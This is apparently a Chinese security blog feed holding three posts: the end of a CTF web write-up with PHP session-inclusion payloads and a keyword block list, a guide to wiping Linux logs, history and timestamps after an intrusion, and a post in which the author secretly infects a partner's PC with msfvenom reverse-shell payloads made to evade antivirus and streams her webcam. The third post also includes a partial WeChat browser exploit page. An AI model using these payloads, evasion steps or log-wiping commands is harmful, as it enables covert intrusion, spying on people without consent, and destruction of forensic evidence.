class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/check2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zefzyj8kapkgt0oad3m.cloudeci1.ichunqiu.com</span><br><span class="line"></span><br><span class="line">url1=http://ss123.828.22.1/</span><br></pre></td></tr></table></figure><p>后面进行目录扫描，发现存在admin文件夹，尝试访问admin文件夹，payload：<code>http://127.0.0.1/admin/</code></p><p><img src="1.png" alt="admin文件夹"></p><p>继续访问include123.php：<code>http://127.0.0.1/admin/include123.php</code></p><p><img src="2.png" alt="include123.php"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$u=$_GET[<span class="string">'u'</span>];</span><br><span class="line"></span><br><span class="line">$pattern = <span class="string">"\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where"</span>;</span><br><span class="line">$pattern .= <span class="string">"|file_put_content|file_get_content|fwrite|curl|system|eval|assert"</span>;</span><br><span class="line">$pattern .=<span class="string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span>;</span><br><span class="line">$pattern .=<span class="string">"|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr"</span>;</span><br><span class="line">$pattern .=<span class="string">"|file|dict|gopher"</span>;</span><br><span class="line"><span class="comment">//累了累了，饮茶先</span></span><br><span class="line"></span><br><span class="line">$vpattern = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($vpattern <span class="keyword">as</span> $value)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">"/$value/i"</span>, $u ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"检测到恶意字符"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>($u);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试了好多个都不行，查看了下session文件包含漏洞,应该是这个。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常见的php-session存放位置：</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sessions<span class="regexp">/sess_PHPSESSID</span></span><br></pre></td></tr></table></figure><p><img src="3.png" alt="PHPSESSID"></p><p>执行下phpinfo成功。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_bedc37fbe5d2e7b064d01cce92e65182&amp;test=<span class="meta">&lt;?</span>=phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;?</span>=<span class="string">"xx"</span><span class="meta">?&gt;</span>为PHP短标签，同等与<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"xxx"</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="4.png" alt="phpinfo()"></p><p>执行lS试试，这边利用了<code>${IFS}</code>代替了空格</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/i</span>nclude123.php?u=<span class="regexp">/tmp/</span>sess_bedc37fbe5d2e7b064d01cce92e65182&amp;test=&lt;?=system(<span class="string">'ls$&#123;IFS&#125;/'</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="ls${IFS}/"></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin boot dev etc getflag.sh home <span class="class"><span class="keyword">lib</span> <span class="title">lib64</span> <span class="title">media</span> <span class="title">mnt</span> <span class="title">opt</span> <span class="title">proc</span> <span class="title">root</span> <span class="title">run</span> <span class="title">sbin</span> <span class="title">srv</span> <span class="title">sys</span> <span class="title">tmp</span> <span class="title">usr</span> <span class="title">var</span> <span class="title">var</span></span></span><br></pre></td></tr></table></figure><p>发现根目录下存在getflag.sh，运行下试试，由于flag被过滤，所以这边利用fl?g来代替flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/i</span>nclude123.php?u=<span class="regexp">/tmp/</span>sess_bedc37fbe5d2e7b064d01cce92e65182&amp;test=&lt;?=system(<span class="string">'.$&#123;IFS&#125;/getfl?g.sh'</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="6.png" alt="getflag.sh"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#2-SESSION" target="_blank" rel="noopener">一篇文章带你理解漏洞之 PHP 文件包含漏洞</a><br><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a><br><a href="https://xz.aliyun.com/t/9948" target="_blank" rel="noopener">yii 2.0.42 最新反序列化利用全集</a><br><a href="https://blog.csdn.net/m0_51078229/article/details/119840772" target="_blank" rel="noopener">[祥云杯2021] wp</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;部分web，太菜了有些做不出来&lt;/p&gt;</summary>
    
    
    
    <category term="SSRF" scheme="https://chenzidu.github.io/categories/SSRF/"/>
    
    
    <category term="WEB" scheme="https://chenzidu.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>Linux痕迹清理</title>
    <link href="https://chenzidu.github.io/2021/08/18/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    <id>https://chenzidu.github.io/2021/08/18/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</id>
    <published>2021-08-18T02:08:17.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透完成之后，为了减少被发现和追溯的概率，攻击者有必要清除自己的攻击痕迹，本文对Linux上清理痕迹的方式做一个总结。（可能不全，只汇总了最多的几种。可能没有做绝）</p><a id="more"></a><h2 id="history清理"><a href="#history清理" class="headerlink" title="history清理"></a>history清理</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~<span class="string">/.bash_history</span></span><br><span class="line"><span class="keyword">history</span> -c</span><br></pre></td></tr></table></figure><h2 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/syslog;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/messages;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/access_log;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/error_log;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/xferlog;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/secure;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/auth.<span class="keyword">log</span>;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/user.<span class="keyword">log</span>;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/btmp;echo &gt; /<span class="keyword">var</span>/<span class="keyword">run</span>/utmp ;history -c</span><br><span class="line">或</span><br><span class="line">echo | tee /<span class="keyword">var</span>/<span class="keyword">log</span>/syslog /<span class="keyword">var</span>/<span class="keyword">log</span>/messages /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/access_log /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/error_log /<span class="keyword">var</span>/<span class="keyword">log</span>/xferlog /<span class="keyword">var</span>/<span class="keyword">log</span>/secure /<span class="keyword">var</span>/<span class="keyword">log</span>/auth.<span class="keyword">log</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/user.<span class="keyword">log</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp /<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog /<span class="keyword">var</span>/<span class="keyword">log</span>/btmp /<span class="keyword">var</span>/<span class="keyword">run</span>/utmp &gt; /dev/null</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure><h2 id="匹配字符更换IP"><a href="#匹配字符更换IP" class="headerlink" title="匹配字符更换IP"></a>匹配字符更换IP</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i "s/<span class="number">132.23.11</span>.x/ <span class="number">192.7.22.12</span>/g" `grep <span class="number">132.23.11</span>.x -rl /var/log`</span><br></pre></td></tr></table></figure><h2 id="修改文件时间"><a href="#修改文件时间" class="headerlink" title="修改文件时间"></a>修改文件时间</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">touch</span> <span class="selector-tag">-r</span> <span class="selector-tag">A</span><span class="selector-class">.php</span> <span class="selector-tag">B</span><span class="selector-class">.php</span>;<span class="selector-tag">history</span> <span class="selector-tag">-c</span></span><br><span class="line">将<span class="selector-tag">B</span>文件改为<span class="selector-tag">A</span>文件时间</span><br><span class="line"><span class="selector-tag">touch</span> <span class="selector-tag">-d</span> "2021<span class="selector-tag">-03-29</span> 14<span class="selector-pseudo">:01</span><span class="selector-pseudo">:22"</span> 1<span class="selector-class">.txt</span>;<span class="selector-tag">history</span> <span class="selector-tag">-c</span></span><br><span class="line">修改文件时间</span><br></pre></td></tr></table></figure><h2 id="删除匹配时间或者其他关键词的行"><a href="#删除匹配时间或者其他关键词的行" class="headerlink" title="删除匹配时间或者其他关键词的行"></a>删除匹配时间或者其他关键词的行</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-16-centos <span class="built_in">log</span>]<span class="comment"># sh delect.sh 2022-06-01</span></span><br><span class="line">delect.sh：</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> `grep <span class="string">"<span class="variable">$1</span>"</span> -rl /var/<span class="built_in">log</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"> tmp=$(sed -e /<span class="variable">$1</span>/d <span class="variable">$f</span>);</span><br><span class="line"> <span class="built_in">printf</span> <span class="string">"%s"</span> <span class="string">"<span class="variable">$tmp</span>"</span> &gt; <span class="variable">$f</span></span><br><span class="line"><span class="keyword">done</span> ;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在渗透完成之后，为了减少被发现和追溯的概率，攻击者有必要清除自己的攻击痕迹，本文对Linux上清理痕迹的方式做一个总结。（可能不全，只汇总了最多的几种。可能没有做绝）&lt;/p&gt;</summary>
    
    
    
    <category term="痕迹清理" scheme="https://chenzidu.github.io/categories/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://chenzidu.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>4.15提醒朋友注意自身网络安全记录</title>
    <link href="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2021-04-19T05:45:48.000Z</published>
    <updated>2022-12-11T09:31:21.953Z</updated>
    
    <content type="html"><![CDATA[<p>那天闲着蛋疼，逛博客的时候发现有一篇教育意义（很狗）的博客，就想着4.15也快到了。趁着这个机会提醒下身边的朋友，在平常网上冲浪的时候注意下网络安全，说不定玩着玩着可能就被不知不觉的直播了。<br>阅读的文章：<a href="https://my.oschina.net/u/4588149/blog/4421821" target="_blank" rel="noopener">一次渗透妹子电脑开摄像头全过程</a></p><a id="more"></a><p>看着特别有意思,不过实践起来一定要注意适当。别干违法的事= =<br>还是简单描述具体思路好了，详细的如果实现不了私聊</p><h2 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h2><ul><li>第一步<br>构建恶意文件<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.指定一个可执行程序 捆绑木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp -e x64/zutto_dekiru LHOST=[IP] <span class="attribute">LPORT</span>=3333 -x webshell.exe -i 12 -f exe -o /root/webshell.exe</span><br><span class="line"></span><br><span class="line">2.联合shellcodeloader免杀制作.bin文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] <span class="attribute">LPORT</span>=3333 -e x64/zutto_dekiru -f<span class="built_in"> raw </span>-o windows.bin</span><br><span class="line"></span><br><span class="line">3.生成c文件</span><br><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp -e x64/zutto_dekiru -i 10 lhost=[IP] <span class="attribute">lport</span>=3333 -f c -o ~/windows.c</span><br><span class="line"></span><br><span class="line">4.Cobaltstrike生成宏病毒代码</span><br><span class="line">一键生成宏代码后，新建一个文档或者用已经有的文档构建。（以word为例）步骤如下：</span><br><span class="line">选择 <span class="string">"视图"</span> -&gt; 宏 -&gt; 查看宏 -&gt; 创建，填入生成的宏代码即可</span><br></pre></td></tr></table></figure></li><li>第二步<br>制作免杀，msfvenom生成的恶意文件基本底裤都被研究完了，生成C文件，再<ol><li>加壳免杀（这个比较简单，我会！！）<ul><li>upx加壳<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">sudo apt-<span class="built_in">get</span> install upx</span><br><span class="line">对windows.<span class="keyword">exe</span>进行加壳，生成的windows-upxed.<span class="keyword">exe</span>文件就是加壳后的</span><br><span class="line">sudo upx windows.<span class="keyword">exe</span> -<span class="keyword">o</span> windows-upxed.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure></li><li>shellcodeloader免杀<br><img src="123213scsadsaxzcadsadsa.jpg" alt="shellcodeloader"><br>生成bin文件后利用shellcodeloader生成免杀文件</li></ul></li><li>生成C文件自己编译,上述命令生成了buf，编译生成exe(最简单的)<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inclde&lt;bits/stdc++.h&gt;</span></span><br><span class="line">using namespace std<span class="comment">;</span></span><br><span class="line"><span class="meta">#将生成的windows.c中buf字符串复制到这里</span></span><br><span class="line">unsigned char buf[······]<span class="comment">;</span></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line"> <span class="built_in">int</span> (*<span class="function"><span class="keyword">func</span>)<span class="params">()</span> = <span class="params">(int(*)</span><span class="params">()</span>)<span class="title">buf</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span>;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li>第三步<br>缕清攻击策略（以我对象为例）  <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 恶意文件捆绑她专业软件破解版发给她（可能会被发现，免杀做的有点粗糙不一定能过）</span><br><span class="line"><span class="number">2.</span> 以八卦的形式（前几天看到项XX瓜，再结合她本身是朝阳区第一吃瓜群众，这个方法可行性最高！但是会报毒，否定）</span><br></pre></td></tr></table></figure></li><li>第四步<br>开始搞看来只能做个恶意程序捆绑正常文件了，先做个垃圾文件。然后更换了图标为网易云的图标。直接冲！<br><img src="sdae_2sdsa17-55-38.jpg" alt=""><br><img src="20210423212319164859.jpg" alt="上线了~"><br>立马移动到别的pid进程去了，然后利用webcam_stream在公网起了个直播哈哈，不过看了会她发现关掉没用，就关机了，然后开机发现没了就跟我得瑟，同志们我还是下手轻了。<br><img src="sdasda021-04-19_18-12-55.jpg" alt=""><br>后面通过她拍的照片发现摄像头边上的灯还是有点用的，毕竟突然亮起来肯定没好事<del>，不过我有物理遮挡</del><br><img src="2021012312163906.jpg" alt=""><br>到现在我发的文件她都不接收了，除非带着vt截图!!果然一朝被蛇咬十年怕井绳，还是亲身经历过，才了解平常网上冲浪要注意安全！<br><img src="1232131231wdsada8.jpg" alt=""></li></ul><h2 id="MSF权限维持"><a href="#MSF权限维持" class="headerlink" title="MSF权限维持"></a>MSF权限维持</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ps</span> <span class="string">-列出正在运行的进程</span></span><br><span class="line"><span class="attr">migrate</span> <span class="string">【PID】 -移动到一个指定的 PID 的活动进程</span></span><br></pre></td></tr></table></figure><h2 id="WeChat-0day上线"><a href="#WeChat-0day上线" class="headerlink" title="WeChat 0day上线"></a>WeChat 0day上线</h2><p>当我看到这个漏洞的时候，我知道轮到她以及他们得瑟的时代结束了~<br>首先生成属于自己的shellcode,然后将buf字符串替换<code>\</code>为<code>,0</code>。在服务器上起一个服务，杀穿了~</p><p><img src="1618843022.jpg" alt=""></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>PC微信好东西<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">ENABLE_LOG = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">IN_WORKER = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// run calc and hang in a loop</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">//buf字符串放在这</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> shellcode = [<span class="number">0xfc</span>,<span class="number">0xe8</span>······];</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">print</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> <span class="params">(value)</span> </span>&#123;</span></span><br><span class="line">    if (value == 0xdecaf0) &#123;</span><br><span class="line">        not_optimised_out += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += 1;</span><br><span class="line">    not_optimised_out |= 0xff;</span><br><span class="line">    not_optimised_out *= 12;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span></span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> g_array;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">cb</span><span class="params">(flag)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span></span><br><span class="line">    g_array[0] = 0x1dbabe * 2;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="string">'c01db33f'</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">gc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">String</span>();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.buffer = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.buffer_view = <span class="literal">null</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_buffer = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_view = <span class="literal">null</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.prevent_opt = [];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span 